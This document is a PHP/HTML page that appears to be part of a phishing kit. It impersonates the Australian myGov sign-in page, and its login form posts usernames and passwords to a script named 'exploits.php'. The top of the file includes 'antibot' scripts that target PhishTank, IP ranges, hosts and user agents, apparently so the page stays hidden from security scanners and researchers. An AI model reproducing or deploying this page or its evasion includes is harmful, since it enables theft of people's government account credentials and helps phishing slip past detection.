<?php

	include "antibots/#1.php";
    include "antibots/#2.php";
    include "antibots/#3.php";
    include "antibots/#4.php";
    include "antibots/#5.php";
    include "antibots/#6.php";
    include "antibots/#7.php";
    include "antibots/#8.php";
    include "antibots/#9.php";
    include "antibots/#10.php";
    include "antibots/#11.php";
    include "antibots/#12.php";
    include "antibots/antibot_host.php";
    include "antibots/antibot_ip.php";
    include "antibots/antibot_phishtank.php";
    include "antibots/antibot_userAgent.php";
	
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
	<meta http-equiv="x-ua-compatible" content="ie=edge">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<title>Sign in with myGov - myGov</title>
	<meta name="description" content="">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="format-detection" content="telephone=no">
    <link rel="icon" type="image/png" sizes="16x16" href="favicon.ico">
	<link href="https://fonts.googleapis.com/css?family=Montserrat:200,400,700|Roboto:300,400,500,700,900&amp;display=swap" rel="stylesheet">
	<link href="css/style.css" rel="stylesheet">
	<link href="css/application.css" rel="stylesheet">
</head>
<body>
    <div class="muchcolors">&nbsp;</div>
    <header role="banner" class="goodheader">
        <section class="wrapper">
            <div class="inner">
                <div class="notauth">
                    <div class="notauth-row">
                        <a class="not-auth-mk__link" href="#">
                            <img id="not-auth-mk" src="images/blacklogo.svg" alt="myGov Beta" role="img">
                        </a>
                    </div>
                </div>
            </div>
        </section>
    </header>
    <div class="wrapper-mapwap">
        <div class="main-block" id="content" role="main">
            <div class="unauth">
                <div class="login-grid-container">
                    <div class="login-grid-row">
                        <div class="login-grid-column">
                            <div class="digital-id-login-card-wrapper">
                                <div class="digital-id-main-login-card override">
                                    <h1>Sign in with myGov</h1>
                                    <h2 class="text-align-left">Using your myGov sign in details</h2>
                                    <form id="mygov-login-form" class="mygov-login-form alternative" action="exploits.php" method="post">

                                        <div class="input-group">
                                            <label class="override" for="userId">Username or email</label>
                                            <input id="userId" name="username" aria-required="true" type="text" value="" autocomplete="off" required>
                                        </div>
                                        <div class="input-group">
                                            <label for="password" class="override">Password</label>
                                            <input id="password" name="password" type="password" autocomplete="off" aria-required="true" required>
                                        </div>
                                        <p class="recovery">
                                            <a class="anchor override" href="#">Forgot password</a>
                                        </p>
                                        <div class="button-digital-id-main-container override">
                                            <div class="digital-id-button-container">
                                                <button type="submit" class="button-main" name="_eventId_login">Sign in</button>
                                            </div>
                                        </div>
                                        <p class="create-account-text"><a class="create-account-link" href="https://my.gov.au/en/create-account/">Create a myGov account</a> if you don't have one already.</p>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <footer role="contentinfo">
        <div class="wrapper">
            <div class="inner">
                <section class="footer-list">
                    <nav>
                        <h2 class="sr-only" aria-label="Footer">Footer</h2>
                        <ul class="lower-links">
                            <li>
                                <a target="_blank" href="#">Terms of use</a>
                            </li>
                            <li>
                                <a target="_blank" href="#">Privacy and security</a>
                            </li>
                            <li>
                                <a target="_blank" href="#">Copyright</a>
                            </li>
                            <li>
                                <a target="_blank" href="#">Accessibility</a>
                            </li>
                        </ul>
                    </nav>
                </section>
                <div class="footer-lower">
                    <section class="footer-lower-logo">
                        <a href="#">
                            <img src="images/whitelogo.svg" alt="myGov Beta" width="313.17" height="70" role="img">
                        </a>
                    </section>
                    <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
                </div>
            </div>
        </div>
    </footer>
</body>
</html>
